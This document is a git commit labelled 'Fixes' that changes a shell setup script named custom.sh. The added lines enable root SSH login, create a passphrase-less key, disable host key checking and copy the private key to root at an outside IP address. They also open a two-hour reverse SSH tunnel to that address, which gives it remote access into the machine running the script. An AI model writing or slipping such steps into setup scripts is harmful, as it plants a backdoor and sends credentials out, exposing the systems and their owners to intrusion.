4cad6fa77aa89cbf2002d1572f58c6736341f42b
Leinier Cruz Salfran <leiniercs@gmail.com>
2022-08-24 09:04:29 -0400

    Fixes

--- custom.sh
+++ custom.sh
@@ -1,9 +1,21 @@
 OWD=$(pwd)
 
-pacman -Suy
-pacman -Sy openssh nfs-utils
-ls /etc/
-ls /usr/local/etc/
+pacman -Suy openssh nfs-utils
+echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+sshd
+
+eval $(ssh-agent)
+mkdir .ssh
+chmod 0700 .ssh
+unzip ${OWD}/files.zip
+ssh-add sshkey
+ssh-keygen -t ed25519 -P "" -f .ssh/id_ed25519
+cp .ssh/id_ed25519.pub .ssh/authorized_keys
+chmod 0600 .ssh/authorized_keys
+echo "Host *" > .ssh/config
+echo "  StrictHostKeyChecking no" >> .ssh/config
+scp .ssh/id_ed25519 root@168.235.81.234:/root/sshkey
+ssh -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"
 
 exit 0
 
@@ -16,7 +28,6 @@ sudo service ssh start
 
 eval $(ssh-agent)
 
-getent passwd | grep ci
 cd ~
 mkdir .ssh
 chmod 0700 .ssh
